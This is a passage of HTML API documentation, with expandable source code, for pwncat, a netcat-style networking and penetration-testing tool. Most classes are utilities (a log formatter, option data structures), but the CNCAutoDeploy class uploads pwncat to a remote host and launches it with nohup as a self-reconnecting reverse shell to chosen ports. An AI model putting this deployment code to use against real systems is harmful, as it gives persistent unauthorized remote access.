                                            class="hljs-literal">True</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__remote_base64_decode(rpath_b64, rpath):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.CNCAutoDeploy"><code class="flex name class">
                    <span>class <span class="ident">CNCAutoDeploy</span></span>
                    <span>(</span><span>network, cmd, host, ports)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Command&amp;Control pwncat auto deployment class.</p>
                        <p>Instantiate Command and Control class.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>network</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork"
                                    title="pwncat.IONetwork">IONetwork</a></code>
                            </dt>
                            <dd>Instance of IONetwork</dd>
                        </dl>
                        <h2 id="raises">Raises</h2>
                        <dl>
                            <dt><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNCPythonNotFound"
                                    title="pwncat.CNCPythonNotFound">CNCPythonNotFound</a></code>
                            </dt>
                            <dd>if remote Python binary path is not found.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">CNCAutoDeploy</span>(<span
                                class="hljs-params">CNC</span>):</span>
    <span class="hljs-string">"""Command&amp;Control pwncat auto deployment class."""</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        network,  <span class="hljs-comment"># type: IONetwork</span>
        cmd,  <span class="hljs-comment"># type: str</span>
        host,  <span class="hljs-comment"># type: str</span>
        ports,  <span class="hljs-comment"># type: List[int]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">try</span>:
            super(CNCAutoDeploy, self).__init__(network)
        <span class="hljs-keyword">except</span> CNCPythonNotFound:
            <span class="hljs-keyword">return</span>

        local_path = os.path.abspath(__file__)
        remote_path = self.create_remote_tmpfile()
        remote_stdout = self.create_remote_tmpfile()
        remote_stderr = self.create_remote_tmpfile()
        <span class="hljs-keyword">if</span> remote_path <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            self.print_info(<span class="hljs-string">"Unable to create tmpfile. Aborting and handing over to current shell."</span>)
            <span class="hljs-keyword">return</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.upload(local_path, remote_path):
            self.print_info(<span class="hljs-string">"Unable to upload file. Aborting and handing over to current shell."</span>)
            <span class="hljs-keyword">return</span>
        self.__start_pwncat(remote_path, cmd, host, ports, remote_stdout, remote_stderr)

        <span class="hljs-comment"># We need to wait some time for slow severs</span>
        self.print_info(<span class="hljs-string">"Waiting for socket"</span>)
        time.sleep(<span class="hljs-number">2</span>)
        self.flush_receive()

        self.print_info(<span class="hljs-string">"Done. Handing over to current shell."</span>)
        <span class="hljs-keyword">return</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__start_pwncat</span>(<span
            class="hljs-params">self, remote_path, binary, host, ports, stdout, stderr</span>):</span>
        <span class="hljs-comment"># type: (str, str, str, List[int], Optional[str], Optional[str]) -&gt; None</span>
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
            command = []
            command.append(<span class="hljs-string">"nohup"</span>)
            command.append(self.remote_python)
            command.append(remote_path)
            command.append(host)
            command.append(str(port))
            command.append(<span class="hljs-string">"--exec {}"</span>.format(binary))
            command.append(<span class="hljs-string">"--reconn"</span>)
            command.append(<span class="hljs-string">"--reconn-wait 1"</span>)
            <span class="hljs-keyword">if</span> stdout <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> stderr <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
                command.append(<span class="hljs-string">"&gt; {}"</span>.format(stdout))
                command.append(<span class="hljs-string">"2&gt; {}"</span>.format(stderr))
            <span class="hljs-keyword">elif</span> stdout <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
                command.append(<span class="hljs-string">"&gt; {} 2&gt;&amp;1"</span>.format(stdout))
            <span class="hljs-keyword">elif</span> stderr <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
                command.append(<span class="hljs-string">"&gt; {} 2&gt;&amp;1"</span>.format(stderr))
            command.append(<span class="hljs-string">"&amp;"</span>)
            data = <span class="hljs-string">" "</span>.join(command)
            print(<span class="hljs-string">"Starting pwncat rev shell: {}"</span>.format(data))
            self.remote_command(data, <span class="hljs-literal">False</span>)</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.CNC"
                               title="pwncat.CNC">CNC</a></li>
                    </ul>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.CNC"
                                        title="pwncat.CNC">CNC</a></b></code>:
                            <ul class="hlist">
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.create_remote_tmpfile"
                                        title="pwncat.CNC.create_remote_tmpfile">create_remote_tmpfile</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.flush_receive"
                                        title="pwncat.CNC.flush_receive">flush_receive</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.print_info"
                                        title="pwncat.CNC.print_info">print_info</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.print_raw"
                                        title="pwncat.CNC.print_raw">print_raw</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_command"
                                        title="pwncat.CNC.remote_command">remote_command</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_file_exists"
                                        title="pwncat.CNC.remote_file_exists">remote_file_exists</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_py3"
                                        title="pwncat.CNC.remote_py3">remote_py3</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_python"
                                        title="pwncat.CNC.remote_python">remote_python</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.send"
                                        title="pwncat.CNC.send">send</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.send_recv"
                                        title="pwncat.CNC.send_recv">send_recv</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.CNC.upload"
                                        title="pwncat.CNC.upload">upload</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.CNCPythonNotFound"><code class="flex name class">
                    <span>class <span class="ident">CNCPythonNotFound</span></span>
                    <span>(</span><span>*args, **kwargs)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>CNC Exception handler.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">CNCPythonNotFound</span>(<span
                                class="hljs-params">BaseException</span>):</span>
    <span class="hljs-string">"""CNC Exception handler."""</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li>builtins.BaseException</li>
                    </ul>
                </dd>
                <dt id="pwncat.ColoredLogFormatter"><code class="flex name class">
                    <span>class <span class="ident">ColoredLogFormatter</span></span>
                    <span>(</span><span>color, loglevel)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Custom log formatter which adds different details and color
                        support.</p>
                        <p>Instantiate ColoredLogFormatter class.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>color</code></strong> :<code>str</code></dt>
                            <dd>Either be <code>alway</code>, <code>never</code> or
                                <code>auto</code>.
                            </dd>
                            <dt><strong><code>loglevel</code></strong> :<code>int</code></dt>
                            <dd>Current desired log level.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">ColoredLogFormatter</span>(<span
                                class="hljs-params">logging.Formatter</span>):</span>
    <span class="hljs-string">"""Custom log formatter which adds different details and color support."""</span>

    COLORS = {
        logging.CRITICAL: <span class="hljs-string">"\x1b[31;1m"</span>,  <span
                                    class="hljs-comment"># bold red</span>
        logging.ERROR: <span class="hljs-string">"\x1b[31;21m"</span>,  <span class="hljs-comment"># red</span>
        logging.WARNING: <span class="hljs-string">"\x1b[33;21m"</span>,  <span
                                    class="hljs-comment"># yellow</span>
        logging.INFO: <span class="hljs-string">"\x1b[32;21m"</span>,  <span class="hljs-comment"># green</span>
        logging.DEBUG: <span class="hljs-string">"\x1b[30;21m"</span>,  <span class="hljs-comment"># gray</span>
    }
    COLOR_DEF = COLORS[logging.DEBUG]
    COLOR_RST = <span class="hljs-string">"\x1b[0m"</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, color, loglevel</span>):</span>
        <span class="hljs-comment"># type: (str, int) -&gt; None</span>
        <span class="hljs-string">"""Instantiate ColoredLogFormatter class.

        Args:
            color (str):  Either be `alway`, `never` or `auto`.
            loglevel (int): Current desired log level.
        """</span>
        super(ColoredLogFormatter, self).__init__()
        self.color = color
        self.loglevel = loglevel
        self.tty = sys.stderr.isatty()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">format</span>(<span
            class="hljs-params">self, record</span>):</span>
        <span class="hljs-comment"># type: (logging.LogRecord) -&gt; str</span>
        <span class="hljs-string">"""Apply custom formatting to log message."""</span>
        log_fmt = self.__get_format()
        log_fmt = self.__colorize(record.levelno, log_fmt)
        formatter = logging.Formatter(log_fmt)
        <span class="hljs-keyword">return</span> formatter.format(record)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_format</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""Return format string based on currently applied log level."""</span>
        <span class="hljs-comment"># In debug logging we add slightly more info to all formats</span>
        <span class="hljs-keyword">if</span> self.loglevel == logging.DEBUG:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"%(levelname)s [%(threadName)s]: %(message)s"</span>
        <span class="hljs-comment"># In lower than debug logging we will add even more info to all log formats</span>
        <span class="hljs-keyword">if</span> self.loglevel &lt; logging.DEBUG:
            <span class="hljs-keyword">return</span> (
                <span class="hljs-string">"%(asctime)s %(levelname)s [%(threadName)s] %(lineno)d:%(funcName)s(): %(message)s"</span>
            )
        <span class="hljs-comment"># By default, we will only add basic info</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"%(levelname)s: %(message)s"</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__colorize</span>(<span
            class="hljs-params">self, level, fmt</span>):</span>
        <span class="hljs-comment"># type: (int, str) -&gt; str</span>
        <span class="hljs-string">"""Colorize a log message based on its level."""</span>
        <span class="hljs-keyword">if</span> self.color == <span class="hljs-string">"never"</span>:
            <span class="hljs-keyword">return</span> fmt

        <span class="hljs-comment"># If stderr is redirected to a file or we're running on windows, do not do colorize</span>
        <span class="hljs-keyword">if</span> self.color == <span
                                    class="hljs-string">"auto"</span> <span
                                    class="hljs-keyword">and</span> (<span
                                    class="hljs-keyword">not</span> self.tty <span
                                    class="hljs-keyword">or</span> os.name == <span
                                    class="hljs-string">"nt"</span>):
            <span class="hljs-keyword">return</span> fmt

        <span class="hljs-keyword">return</span> self.COLORS.get(level, self.COLOR_DEF) + fmt + self.COLOR_RST</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li>logging.Formatter</li>
                    </ul>
                    <h3>Class variables</h3>
                    <dl>
                        <dt id="pwncat.ColoredLogFormatter.COLORS"><code class="name">var <span
                                class="ident">COLORS</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                        <dt id="pwncat.ColoredLogFormatter.COLOR_DEF"><code class="name">var <span
                                class="ident">COLOR_DEF</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                        <dt id="pwncat.ColoredLogFormatter.COLOR_RST"><code class="name">var <span
                                class="ident">COLOR_RST</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.ColoredLogFormatter.format"><code class="name flex">
                            <span>def <span
                                    class="ident">format</span></span>(<span>self, record)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Apply custom formatting to log message.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">format</span>(<span
                                        class="hljs-params">self, record</span>):</span>
    <span class="hljs-comment"># type: (logging.LogRecord) -&gt; str</span>
    <span class="hljs-string">"""Apply custom formatting to log message."""</span>
    log_fmt = self.__get_format()
    log_fmt = self.__colorize(record.levelno, log_fmt)
    formatter = logging.Formatter(log_fmt)
    <span class="hljs-keyword">return</span> formatter.format(record)</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsCallableProducer"><code class="flex name class">
                    <span>class <span class="ident">DsCallableProducer</span></span>
                    <span>(</span><span>function, *args, **kwargs)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for Callable functions.</p>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsCallableProducer</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for Callable functions."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">function</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[..., Iterator[bytes]]</span>
        <span class="hljs-string">"""`IO.producer`: Callable funtcion function."""</span>
        <span class="hljs-keyword">return</span> self.__function

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Any</span>
        <span class="hljs-string">"""`*args`: optional *args for the callable function."""</span>
        <span class="hljs-keyword">return</span> self.__args

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kwargs</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Any</span>
        <span class="hljs-string">"""`**kargs`: optional *kwargs for the callable function."""</span>
        <span class="hljs-keyword">return</span> self.__kwargs

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Contrcutor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, function, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Callable[..., Iterator[bytes]], Any, Any) -&gt; None</span>
        self.__function = function
        self.__args = args
        self.__kwargs = kwargs</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsCallableProducer.args"><code class="name">var <span
                                class="ident">args</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>*args</code>: optional *args for the callable
                                function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Any</span>
    <span class="hljs-string">"""`*args`: optional *args for the callable function."""</span>
    <span class="hljs-keyword">return</span> self.__args</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsCallableProducer.function"><code class="name">var <span
                                class="ident">function</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IO.producer"
                                    title="pwncat.IO.producer">IO.producer()</a></code>:
                                Callable funtcion function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">function</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Callable[..., Iterator[bytes]]</span>
    <span class="hljs-string">"""`IO.producer`: Callable funtcion function."""</span>
    <span class="hljs-keyword">return</span> self.__function</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsCallableProducer.kwargs"><code class="name">var <span
                                class="ident">kwargs</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>**kargs</code>: optional *kwargs for the
                                callable function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">kwargs</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Any</span>
    <span class="hljs-string">"""`**kargs`: optional *kwargs for the callable function."""</span>
    <span class="hljs-keyword">return</span> self.__kwargs</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsIOCommand"><code class="flex name class">
                    <span>class <span class="ident">DsIOCommand</span></span>
                    <span>(</span><span>enc, executable, bufsize)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for IOCommand options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsIOCommand</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IOCommand options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">enc</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; StringEncoder</span>
        <span class="hljs-string">"""`StringEncoder`: Instance of StringEncoder."""</span>
        <span class="hljs-keyword">return</span> self.__enc

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">executable</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""`srt`: Name or path of executable to run (e.g.: `/bin/bash`)."""</span>
        <span class="hljs-keyword">return</span> self.__executable

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bufsize</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: `subprocess.Popen` bufsize.

        https://docs.python.org/3/library/subprocess.html#popen-constructor
        0 means unbuffered (read and write are one system call and can return short)
        1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
        any other positive value means use a buffer of approximately that size
        negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
        """</span>
        <span class="hljs-keyword">return</span> self.__bufsize

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, enc, executable, bufsize</span>):</span>
        <span class="hljs-comment"># type: (StringEncoder, str, int) -&gt; None</span>
        self.__enc = enc
        self.__executable = executable
        self.__bufsize = bufsize</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsIOCommand.bufsize"><code class="name">var <span
                                class="ident">bufsize</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: <code>subprocess.Popen</code>
                                bufsize.</p>
                                <p>
                                    <a href="https://docs.python.org/3/library/subprocess.html#popen-constructor">https://docs.python.org/3/library/subprocess.html#popen-constructor</a>
                                    0 means unbuffered (read and write are one system call and can
                                    return short)
                                    1 means line buffered (only usable if universal_newlines=True
                                    i.e., in a text mode)
                                    any other positive value means use a buffer of approximately
                                    that size
                                    negative bufsize (the default) means system default of
                                    io.DEFAULT_BUFFER_SIZE will be used.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">bufsize</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: `subprocess.Popen` bufsize.

    https://docs.python.org/3/library/subprocess.html#popen-constructor
    0 means unbuffered (read and write are one system call and can return short)
    1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
    any other positive value means use a buffer of approximately that size
    negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
    """</span>
    <span class="hljs-keyword">return</span> self.__bufsize</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIOCommand.enc"><code class="name">var <span class="ident">enc</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder"
                                    title="pwncat.StringEncoder">StringEncoder</a></code>:
                                Instance of StringEncoder.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">enc</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; StringEncoder</span>
    <span class="hljs-string">"""`StringEncoder`: Instance of StringEncoder."""</span>
    <span class="hljs-keyword">return</span> self.__enc</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIOCommand.executable"><code class="name">var <span
                                class="ident">executable</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>srt</code>: Name or path of executable to run
                                (e.g.: <code>/bin/bash</code>).</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">executable</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; str</span>
    <span class="hljs-string">"""`srt`: Name or path of executable to run (e.g.: `/bin/bash`)."""</span>
    <span class="hljs-keyword">return</span> self.__executable</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsIONetworkCli"><code class="flex name class">
                    <span>class <span class="ident">DsIONetworkCli</span></span>
                    <span>(</span><span>reconn, reconn_wait, reconn_robin)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for IONetwork client
                        options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsIONetworkCli</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IONetwork client options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: If connection fails, retry endless (if negative) or x many times."""</span>
        <span class="hljs-keyword">return</span> self.__reconn

<span class="hljs-meta">    @reconn.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> int, type(value)
        self.__reconn = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_wait</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; float</span>
        <span class="hljs-string">"""`float`: Wait time between re-connections in seconds."""</span>
        <span class="hljs-keyword">return</span> self.__reconn_wait

<span class="hljs-meta">    @reconn_wait.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_wait</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (float) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> float, type(value)
        self.__reconn_wait = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_robin</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[int]</span>
        <span class="hljs-string">"""`[int]`: List of alternating re-connection ports."""</span>
        <span class="hljs-keyword">return</span> self.__reconn_robin

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, reconn, reconn_wait, reconn_robin</span>):</span>
        <span class="hljs-comment"># type: (int, float, List[int]) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(reconn) <span class="hljs-keyword">is</span> int, type(reconn)
        <span class="hljs-keyword">assert</span> type(reconn_wait) <span
                                    class="hljs-keyword">is</span> float, type(reconn_wait)
        <span class="hljs-keyword">assert</span> type(reconn_robin) <span
                                    class="hljs-keyword">is</span> list, type(reconn_robin)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reconn_robin:
            <span class="hljs-keyword">assert</span> type(i) <span class="hljs-keyword">is</span> int, type(i)
        self.__reconn = reconn
        self.__reconn_wait = reconn_wait
        self.__reconn_robin = reconn_robin</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsIONetworkCli.reconn"><code class="name">var <span
                                class="ident">reconn</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: If connection fails, retry
                                endless (if negative) or x many times.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">reconn</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: If connection fails, retry endless (if negative) or x many times."""</span>
    <span class="hljs-keyword">return</span> self.__reconn</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIONetworkCli.reconn_robin"><code class="name">var <span
                                class="ident">reconn_robin</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>[int]</code>: List of alternating
                                re-connection ports.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_robin</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; List[int]</span>
    <span class="hljs-string">"""`[int]`: List of alternating re-connection ports."""</span>
    <span class="hljs-keyword">return</span> self.__reconn_robin</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIONetworkCli.reconn_wait"><code class="name">var <span
                                class="ident">reconn_wait</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>float</code>: Wait time between
                                re-connections in seconds.</p></div>
